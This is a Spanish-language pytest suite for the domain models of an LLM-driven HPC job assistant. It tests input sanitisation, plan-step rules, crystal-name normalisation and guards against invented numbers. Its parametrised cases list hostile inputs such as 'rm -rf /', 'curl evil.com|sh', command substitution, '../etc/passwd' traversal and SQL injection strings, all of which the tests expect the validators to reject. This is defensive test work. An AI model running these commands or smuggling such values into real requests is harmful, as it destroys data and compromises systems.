"""Tests de los modelos de dominio: validación y sanitización.

Esta es la frontera de seguridad del sistema: si estos tests pasan,
ningún parámetro malicioso del LLM llega a construir un comando.
"""
import pytest
from pydantic import ValidationError

from becario.domain.models import (
    ClusterIdentity,
    HistoryFilter,
    Intent,
    JobId,
    ListFilesRequest,
    PendingAction,
    PendingPlan,
    Plan,
    PlanStep,
    RemoteDirRequest,
    SlurmJobRequest,
    StructureQuery,
    StructureRequest,
    ViewFileRequest,
    ASE_CRYSTALS,
    descartar_numeros_inventados,
    is_plausible_formula,
    needs_explicit_lattice,
    normalize_crystal,
    normalize_crystal_system,
)


class TestSlurmJobRequest:
    def test_valid_request(self):
        req = SlurmJobRequest(
            job_name="grafeno_dft",
            partition="gpu",
            nodes=2,
            time_limit="12:00:00",
            script_path="/home/user/calc.sh",
        )
        assert req.job_name == "grafeno_dft"
        assert req.nodes == 2

    def test_defaults(self):
        req = SlurmJobRequest(script_path="/opt/run.sh")
        assert req.job_name == "becario_job"
        assert req.partition == "default"
        assert req.nodes == 1
        assert req.time_limit == "01:00:00"

    def test_job_name_is_sanitized_not_rejected(self):
        # El nombre viene del LLM: caracteres raros se reemplazan por _
        req = SlurmJobRequest(job_name="mi job; rm -rf /", script_path="/a/b.sh")
        assert ";" not in req.job_name
        assert " " not in req.job_name
        assert "/" not in req.job_name

    @pytest.mark.parametrize(
        "evil",
        [
            "/tmp/x.sh; rm -rf /",
            "/tmp/x.sh && curl evil.com|sh",
            "/tmp/$(whoami).sh",
            "/tmp/`id`.sh",
            "relative/path.sh",
            "/tmp/../etc/passwd",
            "/tmp/x.sh\nscancel -u root",
            "/tmp/x'.sh",
        ],
    )
    def test_script_path_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            SlurmJobRequest(script_path=evil)

    @pytest.mark.parametrize("evil", ["gpu; ls", "gpu&&id", "gpu partition", "gpu\n"])
    def test_partition_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            SlurmJobRequest(partition=evil, script_path="/a/b.sh")

    @pytest.mark.parametrize(
        "bad_time", ["100", "1:2:3x", "24h", "; sleep 99", "01:00:00; ls"]
    )
    def test_time_limit_injection_rejected(self, bad_time):
        with pytest.raises(ValidationError):
            SlurmJobRequest(time_limit=bad_time, script_path="/a/b.sh")

    @pytest.mark.parametrize("good_time", ["01:00:00", "123:59:59", "2-12:00:00"])
    def test_time_limit_valid_formats(self, good_time):
        req = SlurmJobRequest(time_limit=good_time, script_path="/a/b.sh")
        assert req.time_limit == good_time

    def test_nodes_bounds(self):
        with pytest.raises(ValidationError):
            SlurmJobRequest(nodes=0, script_path="/a/b.sh")
        with pytest.raises(ValidationError):
            SlurmJobRequest(nodes=1000, script_path="/a/b.sh")


class TestJobId:
    @pytest.mark.parametrize("good", ["12345", "1", "123456_78"])
    def test_valid(self, good):
        assert JobId(value=good).value == good

    @pytest.mark.parametrize(
        "evil",
        ["12345; scancel -u root", "$(id)", "12345 67890", "", "abc", "12\n345"],
    )
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            JobId(value=evil)

    def test_surrounding_whitespace_is_normalized(self):
        # Los LLM suelen agregar whitespace: se limpia con strip y luego se
        # valida estricto. El resultado nunca contiene el newline.
        assert JobId(value="12345\n").value == "12345"
        assert JobId(value="  12345  ").value == "12345"


class TestRemoteDirRequest:
    @pytest.mark.parametrize("good", ["/home/ana/pruebas", "/scratch/runs/Zr_hcp"])
    def test_valid(self, good):
        assert RemoteDirRequest(path=good).path == good

    def test_surrounding_whitespace_is_normalized(self):
        assert RemoteDirRequest(path="  /home/ana/pruebas  ").path == "/home/ana/pruebas"

    @pytest.mark.parametrize(
        "evil",
        [
            "relativa/pruebas",
            "/tmp/../etc",
            "/tmp/x; rm -rf /",
            "/tmp/$(whoami)",
            "/tmp/`id`",
            "/tmp/x\nscancel -u root",
            "/tmp/x'",
            "",
        ],
    )
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            RemoteDirRequest(path=evil)


class TestListFilesRequest:
    """Comparte `_validate_remote_dir_path` con `RemoteDirRequest`: basta
    verificar que la política compartida rige también acá."""

    def test_valid_path_and_whitespace(self):
        assert ListFilesRequest(path="  /data/becario_runs ").path == "/data/becario_runs"

    @pytest.mark.parametrize("evil", ["relativa/x", "/tmp/../etc", "/tmp/$(id)"])
    def test_injection_rejected(self, evil):
        with pytest.raises(ValidationError):
            ListFilesRequest(path=evil)


class TestHistoryFilter:
    def test_sql_wildcards_are_data_not_code(self):
        # Con queries parametrizadas, esto es solo texto de búsqueda.
        flt = HistoryFilter(name_contains="'; DROP TABLE historial_calculos; --")
        assert flt.name_contains is not None

    def test_bad_job_id_rejected(self):
        with pytest.raises(ValidationError):
            HistoryFilter(job_id="1 OR 1=1")

    def test_limit_bounds(self):
        with pytest.raises(ValidationError):
            HistoryFilter(limit=0)
        with pytest.raises(ValidationError):
            HistoryFilter(limit=999)


class TestPendingAction:
    def test_tokens_are_unique(self):
        a1 = PendingAction(chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={})
        a2 = PendingAction(chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={})
        assert a1.token != a2.token

    def test_expiry(self):
        action = PendingAction(
            chat_id=1, requester_id=1, intent=Intent.CANCEL_JOB, description="", payload={}
        )
        assert not action.expired(ttl_seconds=60)
        action.created_at -= 120
        assert action.expired(ttl_seconds=60)


class TestClusterIdentity:
    def test_valid(self):
        idn = ClusterIdentity(
            telegram_user_id=111, ssh_user="jperez", ssh_key_path="/x/id_rsa"
        )
        assert idn.ssh_user == "jperez"
        assert idn.ssh_host is None  # usa el host global por defecto

    @pytest.mark.parametrize(
        "evil", ["root; rm -rf /", "Jperez", "j perez", "-jperez", "a" * 33]
    )
    def test_invalid_ssh_user_rejected(self, evil):
        with pytest.raises(ValidationError):
            ClusterIdentity(telegram_user_id=1, ssh_user=evil, ssh_key_path="/x")

    def test_optional_host_override(self):
        idn = ClusterIdentity(
            telegram_user_id=1, ssh_user="jperez", ssh_key_path="/x",
            ssh_host="otro-cluster.edu.ar",
        )
        assert idn.ssh_host == "otro-cluster.edu.ar"


class TestIntent:
    def test_destructive_set(self):
        assert Intent.SUBMIT_SLURM in Intent.destructive()
        assert Intent.CANCEL_JOB in Intent.destructive()
        assert Intent.CHECK_STATUS not in Intent.destructive()
        assert Intent.QUERY_DB not in Intent.destructive()


def _listar(destino: str) -> PlanStep:
    return PlanStep(action=Intent.LIST_FILES, parametros={"destino_remoto": destino})


class TestPlan:
    """Suite de validación del Plan: forma fail-closed, tope de pasos y la
    regla "a lo sumo un paso destructivo y, si existe, va al final"."""

    def test_single_safe_step_is_accepted(self):
        plan = Plan(steps=[PlanStep(action=Intent.CHECK_STATUS)])
        assert len(plan.steps) == 1

    def test_single_destructive_step_is_accepted(self):
        plan = Plan(steps=[PlanStep(action=Intent.SUBMIT_SLURM)])
        assert len(plan.steps) == 1

    def test_safe_composition_is_accepted(self):
        plan = Plan(
            steps=[
                PlanStep(action=Intent.CREATE_DIR),
                PlanStep(action=Intent.LIST_FILES),
            ]
        )
        assert [s.action for s in plan.steps] == [Intent.CREATE_DIR, Intent.LIST_FILES]

    def test_destructive_step_allowed_as_last(self):
        plan = Plan(
            steps=[
                PlanStep(action=Intent.CREATE_DIR),
                PlanStep(action=Intent.SUBMIT_SLURM),
            ]
        )
        assert plan.steps[-1].action == Intent.SUBMIT_SLURM

    def test_destructive_step_not_last_rejected(self):
        with pytest.raises(ValidationError):
            Plan(
                steps=[
                    PlanStep(action=Intent.SUBMIT_SLURM),
                    PlanStep(action=Intent.CREATE_DIR),
                ]
            )

    def test_two_destructive_steps_rejected(self):
        with pytest.raises(ValidationError):
            Plan(
                steps=[
                    PlanStep(action=Intent.SUBMIT_SLURM),
                    PlanStep(action=Intent.CANCEL_JOB),
                ]
            )

    def test_too_many_steps_rejected(self):
        # Cap estructural = 11 (ADR-0007): acota una descomposición desbocada.
        # El tope se aplica al plan CRUDO, antes de colapsar tartamudeos.
        with pytest.raises(ValidationError):
            Plan(steps=[_listar(f"/d{i}") for i in range(12)])

    def test_max_steps_is_accepted(self):
        # Pasos DISTINTOS a propósito: once `listar_archivos` con los mismos
        # parámetros son un tartamudeo y `_v_collapse_stutter` los reduce a
        # uno. El tope y el colapso son reglas separadas.
        plan = Plan(steps=[_listar(f"/d{i}") for i in range(11)])
        assert len(plan.steps) == 11

    def test_empty_steps_rejected(self):
        with pytest.raises(ValidationError):
            Plan(steps=[])

    def test_step_parametros_default_empty_dict(self):
        step = PlanStep(action=Intent.LIST_FILES)
        assert step.parametros == {}


class TestPlanCollapsesStutter:
    """El modelo a veces repite un paso idéntico. Colapsarlo es del dominio:
    dos pasos iguales pasaban la validación de forma y el trabajo se hacía
    dos veces."""

    def _preparar(self, **params) -> PlanStep:
        return PlanStep(action=Intent.PREPARE_CALC, parametros=params)

    def test_the_measured_bug_a_duplicated_prepare_becomes_one(self):
        # qwen2.5-coder:14b sobre "relajá el bulk de Zr hcp" devolvía esto
        # unánime en 3 de 3: el cálculo se preparaba dos veces.
        params = {"formula": "Zr", "red_cristalina": "hcp"}
        plan = Plan(steps=[self._preparar(**params), self._preparar(**params)])
        assert len(plan.steps) == 1
        assert plan.steps[0].parametros == params

    def test_same_action_with_different_params_is_two_real_calculations(self):
        # La regla mira acción Y parámetros: dos cálculos distintos que el
        # usuario pidió no se pueden fusionar.
        plan = Plan(
            steps=[self._preparar(formula="Zr"), self._preparar(formula="Si")]
        )
        assert [s.parametros["formula"] for s in plan.steps] == ["Zr", "Si"]

    def test_a_repeat_that_is_not_consecutive_survives(self):
        # "listá /a, creá /b, listá /a de nuevo" — mirar antes y después es
        # una repetición pedida a propósito.
        plan = Plan(
            steps=[
                _listar("/a"),
                PlanStep(action=Intent.CREATE_DIR, parametros={"destino_remoto": "/b"}),
                _listar("/a"),
            ]
        )
        assert len(plan.steps) == 3

    def test_a_stuttered_destructive_step_collapses_instead_of_being_rejected(self):
        # Sin colapsar primero, dos `enviar_slurm` son dos destructivos y
        # `_v_destructive_last` tiraría el plan ENTERO. El orden de los dos
        # validadores es lo que hace que esto funcione.
        step = PlanStep(action=Intent.SUBMIT_SLURM, parametros={"nombre_trabajo": "zr"})
        plan = Plan(steps=[step, step])
        assert len(plan.steps) == 1
        assert plan.steps[0].action == Intent.SUBMIT_SLURM

    def test_more_than_two_repeats_collapse_to_one(self):
        plan = Plan(steps=[_listar("/a")] * 4)
        assert len(plan.steps) == 1

    def test_a_stutter_in_the_middle_of_a_longer_plan(self):
        plan = Plan(
            steps=[
                PlanStep(action=Intent.CREATE_DIR, parametros={"destino_remoto": "/a"}),
                _listar("/a"),
                _listar("/a"),
                PlanStep(action=Intent.SUBMIT_SLURM),
            ]
        )
        assert [s.action for s in plan.steps] == [
            Intent.CREATE_DIR, Intent.LIST_FILES, Intent.SUBMIT_SLURM,
        ]

    def test_a_plan_without_repeats_is_untouched(self):
        steps = [_listar("/a"), _listar("/b"), _listar("/c")]
        assert Plan(steps=steps).steps == steps

    def test_two_calcs_without_material_are_NOT_collapsed(self):
        # "relajá ZrO2 en bcc y en fcc" puede salir así: dos cálculos que se
        # ven idénticos porque el modelo perdió justo lo que los distingue.
        # Fusionarlos se comería un cálculo. Un valor ausente no puede
        # colapsar dos estados distintos.
        plan = Plan(
            steps=[
                self._preparar(tipo_calculo="relajacion"),
                self._preparar(tipo_calculo="relajacion"),
            ]
        )
        assert len(plan.steps) == 2

    def test_not_collapsing_keeps_the_signal_that_triggers_recovery(self):
        # `BecarioService._needs_decomposition` busca un plan multi-paso con
        # un cálculo sin material para volver a pedirlo descompuesto. Si el
        # colapso lo dejara en un solo paso, esa recuperación no se dispara.
        plan = Plan(
            steps=[
                PlanStep(action=Intent.CREATE_DIR, parametros={"destino_remoto": "/a"}),
                self._preparar(tipo_calculo="relajacion"),
                self._preparar(tipo_calculo="relajacion"),
            ]
        )
        assert len(plan.steps) >= 2
        assert any(
            s.action is Intent.PREPARE_CALC and not s.parametros.get("formula")
            for s in plan.steps
        )

    def test_slabs_without_material_are_not_collapsed_either(self):
        # Las losas entran por MODIFY_STRUCTURE y también llevan `formula`.
        step = PlanStep(
            action=Intent.MODIFY_STRUCTURE,
            parametros={"tipo_estructura": "slab", "miller": [1, 0, 0]},
        )
        assert len(Plan(steps=[step, step]).steps) == 2

    def test_a_stuttered_calc_WITH_material_still_collapses(self):
        # El contraste que fija la regla: con material, son el mismo paso.
        plan = Plan(
            steps=[
                self._preparar(formula="Zr", tipo_calculo="relajacion"),
                self._preparar(formula="Zr", tipo_calculo="relajacion"),
            ]
        )
        assert len(plan.steps) == 1


class TestPendingPlan:
    """`PendingPlan` es la unidad que guarda el ConfirmationStore: un token
    y un TTL por plan, con pasos ordenados en forma de `PendingAction`."""

    def _step(self, intent: Intent = Intent.CANCEL_JOB, request_intent=None) -> PendingAction:
        return PendingAction(
            chat_id=1,
            requester_id=1,
            intent=intent,
            description="",
            payload={},
            request_intent=request_intent,
        )

    def test_tokens_are_unique(self):
        p1 = PendingPlan(chat_id=1, requester_id=1, steps=[self._step()])
        p2 = PendingPlan(chat_id=1, requester_id=1, steps=[self._step()])
        assert p1.token != p2.token

    def test_expiry(self):
        plan = PendingPlan(chat_id=1, requester_id=1, steps=[self._step()])
        assert not plan.expired(ttl_seconds=60)
        plan.created_at -= 120
        assert plan.expired(ttl_seconds=60)

    def test_allow_modify_false_when_no_step_is_modifiable(self):
        plan = PendingPlan(chat_id=1, requester_id=1, steps=[self._step(request_intent=None)])
        assert plan.allow_modify is False

    def test_allow_modify_true_when_any_step_is_modifiable(self):
        plan = PendingPlan(
            chat_id=1,
            requester_id=1,
            steps=[
                self._step(intent=Intent.CANCEL_JOB, request_intent=None),
                self._step(intent=Intent.SUBMIT_SLURM, request_intent=Intent.SUBMIT_SLURM),
            ],
        )
        assert plan.allow_modify is True


class TestIsPlausibleFormula:
    """`is_plausible_formula` es la frontera anti-alucinación para
    'formula': acepta símbolos/fórmulas químicas reales y rechaza
    cualquier otra cosa que el LLM haya inventado (p. ej. una referencia
    mal resuelta como 'ultimo_calculo')."""

    @pytest.mark.parametrize(
        "formula", ["Zr", "W", "Si", "NaCl", "TiO2", "H2O", "Au"]
    )
    def test_plausible_formulas(self, formula):
        assert is_plausible_formula(formula) is True

    @pytest.mark.parametrize(
        "formula",
        [
            "ultimo_calculo",  # tiene '_': ni siquiera pasa el regex base
            "ultimocalculo",  # pasa el regex pero no tokeniza en elementos
            "",
            "último",
            "calc-1",
            "Xx7",  # 'Xx' no es un símbolo real
            "123",
            "A_B",
        ],
    )
    def test_implausible_formulas(self, formula):
        assert is_plausible_formula(formula) is False


class TestNormalizeCrystal:
    """La red se dicta por voz o la escribe un LLM, así que llega en
    castellano, con acentos y con separadores. `normalize_crystal` la deja
    en el nombre que entiende ASE, o dice que no existe."""

    @pytest.mark.parametrize(
        "raw,expected",
        [
            ("fcc", "fcc"),
            ("FCC", "fcc"),
            ("  Fluorite ", "fluorite"),
            ("fluorita", "fluorite"),
            ("diamante", "diamond"),
            ("sal de roca", "rocksalt"),
            ("Sal-De-Roca", "rocksalt"),
            ("cloruro de cesio", "cesiumchloride"),
            ("hexagonal compacta", "hcp"),
            ("romboédrica", "rhombohedral"),
            ("ortorrómbica", "orthorhombic"),
        ],
    )
    def test_known_names(self, raw, expected):
        assert normalize_crystal(raw) == expected

    @pytest.mark.parametrize("raw", ["", "perovskita", "fluorit", "xyz", "42"])
    def test_unknown_names(self, raw):
        assert normalize_crystal(raw) is None

    def test_ase_crystals_matches_ase(self):
        """El dominio no importa ASE, así que la lista está copiada a mano.
        Este test es el que avisa si ASE agrega o saca una red."""
        import inspect
        import re

        from ase.build import bulk

        # `bulk` valida contra este literal en su cuerpo.
        source = inspect.getsource(bulk)
        declared = set(re.findall(r"'([a-z]+)'", source))
        assert ASE_CRYSTALS <= declared, ASE_CRYSTALS - declared

    def test_request_normalizes_and_rejects(self):
        req = StructureRequest(formula="ZrO2", crystal="Fluorita", lattice_a=5.07)
        assert req.crystal == "fluorite"
        with pytest.raises(ValidationError, match="red cristalina inválida"):
            StructureRequest(formula="ZrO2", crystal="perovskita", lattice_a=5.07)


class TestNormalizeCrystalSystem:
    """El sistema cristalino es OTRO vocabulario que el prototipo de ASE: en
    materiales una fase se nombra por su sistema ("la ZrO2 tetragonal"), y
    los nombres mineralógicos (fluorita, rocksalt) son de química."""

    @pytest.mark.parametrize(
        "raw,expected",
        [
            ("monoclínica", "Monoclinic"),
            ("monoclinica", "Monoclinic"),
            ("Monoclinic", "Monoclinic"),
            ("tetragonal", "Tetragonal"),
            ("cúbica", "Cubic"),
            ("cubic", "Cubic"),
            ("ortorrómbica", "Orthorhombic"),
            ("romboédrica", "Trigonal"),
            ("hexagonal", "Hexagonal"),
            ("triclínica", "Triclinic"),
        ],
    )
    def test_known_systems(self, raw, expected):
        assert normalize_crystal_system(raw) == expected

    @pytest.mark.parametrize("raw", ["", "fluorita", "rocksalt", "perovskita", "fcc"])
    def test_not_a_crystal_system(self, raw):
        assert normalize_crystal_system(raw) is None

    def test_query_normalizes_and_rejects(self):
        q = StructureQuery(formula="ZrO2", crystal_system="tetragonal")
        assert q.crystal_system == "Tetragonal"
        with pytest.raises(ValidationError, match="sistema cristalino inválido"):
            StructureQuery(formula="ZrO2", crystal_system="fluorita")

    def test_the_formula_decides_which_vocabulary_wins(self):
        """'monoclínica' es ambigua: prototipo `mcl` de ASE o fase
        monoclínica. La fórmula desempata, porque `mcl` pide UN átomo y no
        sirve para un compuesto."""
        assert StructureRequest(
            formula="Si", crystal="monoclínica"
        ).crystal == "mcl"
        assert StructureRequest(
            formula="ZrO2", crystal="monoclínica", lattice_a=5.2
        ).crystal == "Monoclinic"

    def test_unambiguous_names_do_not_depend_on_the_formula(self):
        # 'fluorita' solo existe como prototipo; 'triclínica' solo como fase.
        assert StructureRequest(
            formula="ZrO2", crystal="fluorita", lattice_a=5.07
        ).crystal == "fluorite"
        assert StructureRequest(formula="Si", crystal="diamante").crystal == "diamond"


class TestNeedsExplicitLattice:
    """ASE tiene datos de referencia por ELEMENTO: 'W' se arma solo, un
    compuesto no. Distinguirlo es lo que permite preguntar en vez de dejar
    que ASE reviente con 'no suitable reference data'."""

    @pytest.mark.parametrize("formula", ["W", "Si", "Zr", "Au"])
    def test_elements_build_alone(self, formula):
        assert needs_explicit_lattice(formula, None, None) is False

    @pytest.mark.parametrize("formula", ["ZrO2", "NaCl", "TiO2", "Fe2O3"])
    def test_compounds_need_lattice(self, formula):
        assert needs_explicit_lattice(formula, None, None) is True

    def test_compound_with_both_is_buildable(self):
        assert needs_explicit_lattice("ZrO2", "fluorite", 5.07) is False

    @pytest.mark.parametrize(
        "crystal,lattice_a", [("fluorite", None), (None, 5.07)]
    )
    def test_half_the_data_is_not_enough(self, crystal, lattice_a):
        # `bulk` de un compuesto exige LAS DOS: con una sola falla igual.
        assert needs_explicit_lattice("ZrO2", crystal, lattice_a) is True


class TestViewFileRequest:
    """`ViewFileRequest` identifica un archivo remoto a mostrar por ruta
    absoluta O por nombre suelto (exactamente uno). El nombre nunca lleva
    separadores ni '..': así el nombre resuelto no puede escaparse del
    directorio de la corrida (path traversal)."""

    def test_bare_filename_is_accepted(self):
        assert ViewFileRequest(filename="CONTCAR").filename == "CONTCAR"

    def test_absolute_path_is_accepted(self):
        req = ViewFileRequest(path="/home/ana/run/OSZICAR")
        assert req.path == "/home/ana/run/OSZICAR"

    @pytest.mark.parametrize(
        "filename",
        [".", "..", "../etc/passwd", "a/b", "sub/CONTCAR", "x;id", ""],
    )
    def test_unsafe_filenames_rejected(self, filename):
        with pytest.raises((ValidationError, ValueError)):
            ViewFileRequest(filename=filename)

    @pytest.mark.parametrize("path", ["relativa", "/x/..", "/x; rm -rf /"])
    def test_invalid_paths_rejected(self, path):
        with pytest.raises((ValidationError, ValueError)):
            ViewFileRequest(path=path)

    def test_requires_exactly_one_form(self):
        with pytest.raises((ValidationError, ValueError)):
            ViewFileRequest()  # ninguna
        with pytest.raises((ValidationError, ValueError)):
            ViewFileRequest(path="/x/CONTCAR", filename="CONTCAR")  # ambas


class TestDescartarNumerosInventados:
    """Frontera anti-alucinación: un número que no está escrito en el
    mensaje no entra al pedido.

    Los dos casos que la motivaron llegaron hasta la pantalla de
    confirmación en producción: un `parametro_red=5.63` inventado al
    responder una PREGUNTA (que no traía ningún número), y un
    `puntos_k=[1,1,1]` agregado a un pedido que hablaba de ENCUT, nodos y
    tiempo. Ninguno de los dos falla solo: entran al INCAR/KPOINTS y la
    corrida sale con otra física.
    """

    def test_drops_the_kpoints_nobody_asked_for(self):
        limpio, fuera = descartar_numeros_inventados(
            {"encut": 600, "nodos": 2, "puntos_k": [1, 1, 1]},
            "aumenta el encut a 600, los nodos a 2 y el tiempo 2hs",
        )
        assert limpio == {"encut": 600, "nodos": 2}
        assert fuera == ["puntos_k"]

    def test_drops_a_lattice_parameter_that_was_asked_not_given(self):
        limpio, fuera = descartar_numeros_inventados(
            {"red_cristalina": "tetragonal", "parametro_red": 5.63},
            "segun Materials Project cual es el parametro de red del ZrO2 tetragonal",
        )
        assert "parametro_red" not in limpio
        assert limpio["red_cristalina"] == "tetragonal", "lo no numérico no se toca"

    @pytest.mark.parametrize(
        "params,texto",
        [
            ({"parametro_red": 5.07}, "fluorita a=5.07"),
            ({"capas": 8}, "que sean 8 capas"),
            ({"nodos": 2}, "usá 2 nodos"),
            ({"encut": 600}, "subí el ENCUT a 600"),
            ({"supercelda": [2, 2, 2]}, "supercelda 2x2x2"),
        ],
    )
    def test_a_number_that_was_written_survives(self, params, texto):
        limpio, fuera = descartar_numeros_inventados(params, texto)
        assert limpio == params and fuera == []

    def test_reformatted_and_glued_fields_are_left_alone(self):
        """`tiempo_limite` se re-formatea ("2hs" -> "02:00:00") y `miller` se
        escribe pegado ("(001)"): en los dos el chequeo de cifras no
        distinguiría nada, así que quedan fuera del guard a propósito."""
        limpio, fuera = descartar_numeros_inventados(
            {"tiempo_limite": "02:00:00", "miller": [0, 0, 1]}, "la (001) por 2hs"
        )
        assert fuera == []
